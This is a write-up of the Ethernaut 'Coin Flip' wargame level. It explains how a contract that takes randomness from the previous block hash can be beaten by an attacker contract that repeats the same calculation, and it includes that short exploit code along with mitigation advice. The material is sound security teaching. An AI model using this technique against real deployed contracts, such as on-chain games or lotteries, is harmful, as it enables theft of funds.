# Ethernaut #4 — Coin Flip

## Vulnerability: Predictable On-Chain Randomness

### The Catch

The contract uses the hash of the previous block to determine the coin flip result.

```solidity
uint256 blockValue = uint256(blockhash(block.number - 1));
uint256 coinFlip = blockValue / FACTOR;
bool side = coinFlip == 1 ? true : false;
```

The problem is that the previous block hash is publicly available. The outcome isn't random, and anyone who reproduces the same calculation can predict it.

### Exploit

I created an attacker contract that replicates the target's calculation and calls `flip()` with the predicted result.

```solidity
function attack() external {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 side = blockValue / FACTOR;
    bool ans = side == 1;

    target.flip(ans);
}
```

Calling `attack()` in separate transactions allows the exploit to accumulate 10 consecutive wins while respecting the target's one-flip-per-block restriction.

### Root Cause

The contract treats publicly available blockchain data as a source of randomness. Since the result is deterministic and reproducible, an attacker can calculate the correct guess before calling `flip()`.

### Impact

An attacker can reliably predict the coin flip outcome and reach the required 10 consecutive wins, bypassing the intended randomness of the game.

### Mitigation

Don't use predictable block properties as randomness for security-sensitive operations. Depending on the use case, use a verifiable randomness solution such as Chainlink VRF or another design appropriate to the application's threat model.

### Key Takeaway

**Blockchain data is not automatically secure randomness.** If an attacker can reproduce the same calculation as the contract, the outcome isn't unpredictable.